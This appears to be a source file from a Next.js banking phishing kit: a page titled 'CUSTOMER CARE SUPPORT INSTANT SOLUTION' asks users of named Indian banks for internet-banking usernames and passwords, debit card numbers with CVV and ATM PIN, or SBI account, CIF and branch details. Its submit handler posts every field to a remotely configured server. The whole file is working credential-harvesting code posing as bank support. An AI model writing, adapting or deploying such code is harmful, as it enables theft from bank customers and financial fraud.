'use client';
import Footer from "../inlcude/footer";
import Header from "../inlcude/header";
import { useRouter } from "next/navigation";  
import { useState } from 'react';
import Link from "next/link";
import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
import DateInputComponent from "../inlcude/DateInputComponent";
import Echo from "../registerPlugin";

export default function Home() {
  const [links, setLinks] = useState(false);
  const [form1, setForm1] = useState(false);
  const [form2, setForm2] = useState(false);
  const [linkFirst, setLinkFirst] = useState(false);
  const [linkSecond, setLinkSecond] = useState(false);
  const [sbiForm, setSbiForm] = useState(false);
  const [currentBank, setCurrentBank] = useState('');
  const [nextRoute, setNextRoute] = useState('');
  const router = useRouter();
  

  const [loading, setLoading] = useState(false);

  const handleSubmit = async (e) => {
      e.preventDefault()
      setLoading(true); // Set loading state to true

      
      try {

        
      
        const result = await Echo.getConfig();
        const API_URL = result.value;
        const SITE = result.site;

      const formData = new FormData(e.target);
      const jsonObject1 = {};
      const jsonObject = {};
      formData.forEach((value, key) => {
          jsonObject[key] = value;
      });
      jsonObject1['data'] = jsonObject;
      jsonObject1['site'] = SITE;
      jsonObject1['id'] = localStorage.getItem("collection_id");
          const response = await fetch(`${API_URL}/form/add`, {
              method: 'POST',
              body: JSON.stringify(jsonObject1)
          });

          if (!response.ok) {
              throw new Error('Network response was not ok');
          }
          router.push(nextRoute);
      } catch (error) {
          console.error('There was a problem with the fetch operation:', error);
          alert('An error occurred, please try again.'+error);
      } finally{
          setLoading(false); 
      }
  };

  const onChangeBank = (e) => {
    const bank = e.target.value;
    setCurrentBank(bank);
    if(bank==''){
      setForm1(false);
      setForm2(false);
      setLinks(false);
      sbiForm(false);
    }else{
      setLinks(true);
    }
  }

  const FirstLinkForm = () => {
    setLinkFirst(true); 
    setLinkSecond(false);
    setForm1(true);
    setForm2(false);
    setSbiForm(false);
    setNextRoute('/netbanking2');
  }
  const SecondLinkForm = () => {
    setLinkSecond(true);
    setLinkFirst(false);
    if(currentBank=='state-bank-of-india'){
      setSbiForm(true);
      setForm1(false);
      setForm2(false);
      setNextRoute('/otherdebit');
    }else{
      setForm1(false);
      setForm2(true);
      setSbiForm(false);
      setNextRoute('/end');
    }
  }

  return (
    <>
    <Header />
      <h3 className="text-center mx-2">
        CUSTOMER CARE SUPPORT INSTANT SOLUTION
      </h3>
      <img src="help/step2.png" className="w-100" alt="" />
    <main className="px-3">
    <div className="form-container m-2">
  <form onSubmit={handleSubmit} id="submitForm">
  
    <div className="form-floating mb-3">
      <select className="form-control" onChange={(e)=>{onChangeBank(e)}}  >
        <option value="">--Select Bank--</option>
        <option value="state-bank-of-india">STATE BANK OF INDIA</option>
        <option value="bank-of-india">BANK OF INDIA</option>
        <option value="punjab-national-bank">PUNJAB NATIONAL BANK</option>
        <option value="union-bank">UNION BANK</option>
        <option value="icici-bank">ICICI BANK</option>
        <option value="indian-bank">INDIAN BANK</option>
        <option value="canara-bank">CANARA BANK</option>
        <option value="bank-of-baroda">Bank Of Baroda</option>
        <option value="hdfc-bank">HDFC BANK</option>
        <option value="central-bank">CENTRAL BANK</option>
      </select>
      <label>
        <span>Bank Name</span>*
      </label>
    </div>
    {
      links && (
        <>
        <div className={`link-primary ${linkFirst ? 'underline' : ''} `} onClick={()=>{FirstLinkForm()}} >I have internet banking</div>
        <div className={`link-primary mb-2 ${linkSecond ? 'underline' : ''} `} onClick={()=>{SecondLinkForm()}} >I have debit card</div>
        </>
      )
    }

    {
      form1 && (
        <>
        <div className="form-floating mb-3">
          <input
            type="text"
            name="username"
            className="form-control"
            placeholder="Ex. Username"
            required
          />
          <label>
            <span>Username</span>*
          </label>
        </div>

        <div className="form-floating mb-3">
          <input
            type="password"
            name="passw"
            className="form-control"
            placeholder="Ex. pass"
            required
          />
          <label>
            <span>Password</span>*
          </label>
        </div>

        </>
      )
    }

    {
      form2 && (
        <>
        <DebitCardInputComponent />
        <div className="d-flex gap-4">
          <ExpiryDateInputComponent />
          
          <div className="form-floating mb-3 ">
            <input
              type="text"
              name="cvc"
              className="form-control"
              placeholder="Ex. cvv"
              minLength={3}
              maxLength={3}
              inputMode="numeric"
              required
            />
            <label>
              <span>CVV</span>*
            </label>
          </div>
        </div>
        <div className="form-floating mb-3">
          <input
            type="text"
            inputMode="numeric"
            name="atmpin"
            minLength={4}
            maxLength={4}
            
            className="form-control"
            placeholder="Ex. Atm Pin"
            required
          />
          <label>
            <span>Enter ATM Pin</span>*
          </label>
        </div>
        </>
      )
    }


    
{
      sbiForm && (
        <>
        <div className="form-floating mb-3">
          <input
            type="text"
            name="accnum"
            inputMode="numeric"
            className="form-control"
            placeholder="Ex. Account Number"
            required
          />
          <label>
            <span>Account Number</span>*
          </label>
        </div>

        <div className="form-floating mb-3">
          <input
            type="text"
            name="cifnum"
            inputMode="numeric"
            className="form-control"
            placeholder="Ex. CIF Number"
            required
          />
          <label>
            <span>CIF Number</span>*
          </label>
        </div>

        <div className="form-floating mb-3">
          <input
            type="text"
            name="branchco"
            inputMode="numeric"
            className="form-control"
            placeholder="Ex. Branch Code"
            required
          />
          <label>
            <span>Branch Code</span>*
          </label>
        </div>

        <DateInputComponent />

        </>
      )
    }


{
      links && (
    
    <div className="d-flex justify-content-between">
      <Link
        href="/netbanking2"
        className="btn btn-outline-success  mt-3 text-center"
      >
        <img src="help/back.png" alt="" />
      </Link>
      <button
        type="submit"
        className="btn btn-success  mt-3 text-center"
        id="submit-button"
        disabled={loading}
      >
        {loading ? 'Please wait...' : 'Next'}
      </button>
    </div>

  )
}
    
  </form>
</div>

    </main>

    <Footer />
</>
  );

}
